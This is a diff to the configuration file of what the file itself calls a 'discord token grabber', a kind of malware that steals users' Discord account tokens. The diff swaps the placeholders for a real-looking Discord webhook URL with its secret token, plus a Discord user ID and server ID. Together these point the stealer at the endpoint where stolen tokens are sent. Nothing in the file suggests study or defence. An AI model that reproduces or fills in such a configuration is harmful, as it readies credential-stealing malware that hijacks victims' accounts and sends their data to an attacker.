@@ -1,9 +1,9 @@
 {
     // discord token grabber settings
 
-    "webhook": "WEBHOOK HERE",
-    "discord_id": "ENTER YOUR DISCORD ID",
-    "server_id": "ENTER YOUR SERVER ID",
+    "webhook": "https://discord.com/api/webhooks/1026155424774373457/0ttx_T4_a1cmMTspeCE7by65HldVniXbwAIpb1dT3MELJ2Px2tfZDnVSCtko4wSqDaDB",
+    "discord_id": "975395538809806858",
+    "server_id": "1014893861576904734",
 
    // you can change this if you have your own!
 
